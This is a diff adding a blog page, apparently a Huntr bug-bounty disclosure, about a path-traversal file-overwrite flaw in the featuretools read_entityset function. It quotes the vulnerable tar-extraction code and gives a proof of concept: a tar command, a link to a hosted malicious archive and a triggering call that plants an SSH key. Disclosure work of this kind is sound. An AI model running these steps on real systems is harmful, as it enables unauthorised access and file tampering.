@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Huntr: Arbitrary File Overwrite in read_entityset api | sunriseXu’s bug hunting journey</title>
+<meta name="generator" content="Jekyll v4.3.3" />
+<meta property="og:title" content="Huntr: Arbitrary File Overwrite in read_entityset api" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Name" />
+<meta property="og:description" content="Name" />
+<link rel="canonical" href="http://localhost:4000/file-overwrite/2024/04/07/arbitrary-file-overwrite-in-onnx-copy.html" />
+<meta property="og:url" content="http://localhost:4000/file-overwrite/2024/04/07/arbitrary-file-overwrite-in-onnx-copy.html" />
+<meta property="og:site_name" content="sunriseXu’s bug hunting journey" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-04-07T10:31:06+08:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Huntr: Arbitrary File Overwrite in read_entityset api" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-04-07T10:31:06+08:00","datePublished":"2024-04-07T10:31:06+08:00","description":"Name","headline":"Huntr: Arbitrary File Overwrite in read_entityset api","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/file-overwrite/2024/04/07/arbitrary-file-overwrite-in-onnx-copy.html"},"url":"http://localhost:4000/file-overwrite/2024/04/07/arbitrary-file-overwrite-in-onnx-copy.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="sunriseXu&apos;s bug hunting journey" /></head>
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">sunriseXu&#39;s bug hunting journey</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">Huntr: Arbitrary File Overwrite in read_entityset api</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2024-04-07T10:31:06+08:00" itemprop="datePublished">Apr 7, 2024
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <h2 id="name">Name</h2>
+
+<blockquote>
+  <p>Huntr: Arbitrary File Overwrite in read_entityset api in featuretools</p>
+</blockquote>
+
+<h2 id="weakness">Weakness</h2>
+
+<blockquote>
+  <p>CWE-22: Path Traversal</p>
+</blockquote>
+
+<h2 id="severity">Severity</h2>
+
+<blockquote>
+  <p>High (8.8)</p>
+</blockquote>
+
+<h2 id="description">Description</h2>
+
+<p>The <a href="https://featuretools.alteryx.com/en/stable/generated/featuretools.read_entityset.html#featuretools.read_entityset">featuretools.read_entityset</a> function does not adequately prevent malicious tar files from performing path traversal attacks. This can allow the downloading of malicious tar files that can overwrite any file. This leads directly to a high impact regarding the integrity of files. An attacker could also abuse this to impact the availability, by deleting system files, personal files, or application files. Remote code execution is also possible through various means.</p>
+
+<p>The vulnerable function is exposed through the <code class="language-plaintext highlighter-rouge">featuretools.read_entityset</code> function, which can be imported easily. It’s an api used to read data_description.json from directory on disk, S3 path, or URL which is tar file.</p>
+
+<p>This code snippet shows how the <code class="language-plaintext highlighter-rouge">read_entityset</code> function extracts a tar file downloaded from internet without performing any security checks.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def read_entityset(path, profile_name=None, **kwargs):
+    """Read entityset from disk, S3 path, or URL.
+
+    Args:
+        path (str): Directory on disk, S3 path, or URL to read `data_description.json`.
+        profile_name (str, bool): The AWS profile specified to write to S3. Will default to None and search for AWS credentials.
+            Set to False to use an anonymous profile.
+        kwargs (keywords): Additional keyword arguments to pass as keyword arguments to the underlying deserialization method.
+    """
+    if _is_url(path) or _is_s3(path) or _is_local_tar(str(path)):
+        with tempfile.TemporaryDirectory() as tmpdir:
+            local_path = path
+            transport_params = None
+
+            if _is_s3(path):
+                transport_params = get_transport_params(profile_name)
+
+            if _is_s3(path) or _is_url(path):
+                local_path = os.path.join(tmpdir, "temporary_es")
+                use_smartopen_es(local_path, path, transport_params) # download file from url!
+            ### tar file extracted to tepdir without any security checks ###
+            with tarfile.open(str(local_path)) as tar:
+                tar.extractall(path=tmpdir)
+
+            data_description = read_data_description(tmpdir)
+            return description_to_entityset(data_description, **kwargs)
+    else:
+        data_description = read_data_description(path)
+        return description_to_entityset(data_description, **kwargs)
+</code></pre></div></div>
+
+<p>The Python documentation explains us that tarfiles may have absolute filenames starting with / which could overwite files in system.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Warning: Never extract archives from untrusted sources without prior inspection. 
+It is possible that files are created outside of path, 
+e.g. members that have absolute filenames starting with "/" or filenames with two dots "..".
+</code></pre></div></div>
+
+<h2 id="proof-of-concept">Proof of Concept</h2>
+
+<p>An attacker can create a malicous tar file using following command:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tar --absolute-names -cvf hack.tar /home/kali/.ssh/authorized_keys
+</code></pre></div></div>
+
+<p>Then, the attacker will upload the <code class="language-plaintext highlighter-rouge">hack.tar</code> to public server.</p>
+
+<p>I have uploaded one malicous tar file for testing: <a href="https://raw.githubusercontent.com/sunriseXu/onnx/main/validated/hack.tar">https://raw.githubusercontent.com/sunriseXu/onnx/main/validated/hack.tar</a></p>
+
+<p>If anyone now downloads tar using <code class="language-plaintext highlighter-rouge">read_entityset</code> api, causing automatically extracting the malicous tar file and overwrite files silently.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import featuretools as ft
+ft.read_entityset(path="https://raw.githubusercontent.com/sunriseXu/onnx/main/validated/hack.tar")
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cat /home/kali/.ssh/authorized_keys
+ssh-rsa xxx hacker@test.com
+</code></pre></div></div>
+
+<p>Tested on Google Colab: <a href="https://colab.research.google.com/drive/1qc7qg_VPPHKVOUT-xhSygg2M7mwDdVTt?usp=sharing">https://colab.research.google.com/drive/1qc7qg_VPPHKVOUT-xhSygg2M7mwDdVTt?usp=sharing</a></p>
+
+<p><img src="https://live.staticflickr.com/65535/53637853744_26b8a5fff7_h.jpg" alt="poc" /></p>
+
+<h2 id="impact">Impact</h2>
+
+<p>This vulnerability can have severe consequences. This section will highlight some tangible impact.</p>
+
+<h3 id="ssh-access">SSH Access</h3>
+
+<p>On servers that have SSH enabled, an attacker may be able to inject their own public RSA key into the authorized_keys file, leading to remote code execution.</p>
+
+<h3 id="web-servers">Web Servers</h3>
+
+<p>On servers hosting web servers, various vulnerabilities can be exploited. On PHP or JSP server, remote code execution may be possible via uploading a webshell. On other servers an HTML file can be uploaded to achieve Cross-site Scripting (XSS)</p>
+
+<h2 id="reference">Reference</h2>
+
+<p><a href="https://huntr.com/bounties/5d7e5752-085c-4e93-af0d-e25f05a27b89">https://huntr.com/bounties/5d7e5752-085c-4e93-af0d-e25f05a27b89</a></p>
+
+<h2 id="occurrences">Occurrences</h2>
+
+<p><a href="https://github.com/alteryx/featuretools/blob/21d0bf0915238ba6c6bc1e958b9a91b209f88de5/featuretools/entityset/deserialize.py#L170">https://github.com/alteryx/featuretools/blob/21d0bf0915238ba6c6bc1e958b9a91b209f88de5/featuretools/entityset/deserialize.py#L170</a></p>
+
+  </div><a class="u-url" href="/file-overwrite/2024/04/07/arbitrary-file-overwrite-in-onnx-copy.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">sunriseXu&#39;s bug hunting journey</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">sunriseXu&#39;s bug hunting journey</li><li><a class="u-email" href="mailto:github@example.com">github@example.com</a></li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/jekyll"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">jekyll</span></a></li><li><a href="https://www.twitter.com/jekyllrb"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">jekyllrb</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>sunriseXu&#39;s bug hunting journey, sharing new findings of bug hunting.</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
